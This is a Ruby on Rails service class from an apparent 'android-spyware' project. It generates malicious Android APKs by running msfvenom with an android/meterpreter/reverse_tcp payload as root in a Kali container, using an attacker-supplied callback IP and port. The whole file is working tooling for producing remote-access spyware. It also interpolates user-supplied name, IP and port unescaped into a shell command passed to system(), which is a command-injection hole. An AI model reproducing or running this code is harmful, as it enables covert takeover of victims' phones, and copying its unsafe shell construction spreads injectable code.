class PayloadGenerationService
  include MsfInstrumentation::ApplicationControllerMixin

  def initialize(apk_payload)
    @payload = apk_payload
  end

  def generate
    SpywareTracing.trace_apk_generation(@payload.name, @payload.destination_ip, @payload.destination_port) do |span|
      begin
        # Paths
        # MSF Container sees: /root/files/payloads/
        # Rails Container sees: /app/android-spyware/files/payloads/ (mapped to same host dir)
        
        filename = "#{@payload.name}.apk"
        # Ensure name ends in .apk
        filename += ".apk" unless filename.end_with?('.apk')
        
        msf_output_path = "/root/files/payloads/#{filename}"
        
        Rails.logger.info("🚀 Generating payload via Docker execution")
        
        # We run msfvenom inside the kali container
        # Note: We rely on the Rails container having the 'docker' binary and access to the socket
        command = "docker exec -u 0 kali_container msfvenom -p android/meterpreter/reverse_tcp " \
                  "LHOST=#{@payload.destination_ip} LPORT=#{@payload.destination_port} R > #{msf_output_path}"

        Rails.logger.debug("Command: #{command}")
        
        if system(command)
          Rails.logger.info("✅ Payload generated at #{msf_output_path}")
          span.set_attribute('generation.status', 'success')
          return true
        else
          Rails.logger.error("❌ Payload generation failed")
          span.set_attribute('generation.status', 'failure')
          return false
        end
      rescue => e
        SpywareTracing.record_error(span, e, 'generate_payload')
        Rails.logger.error("Error in payload generation: #{e.message}")
        return false
      end
    end
  end
end
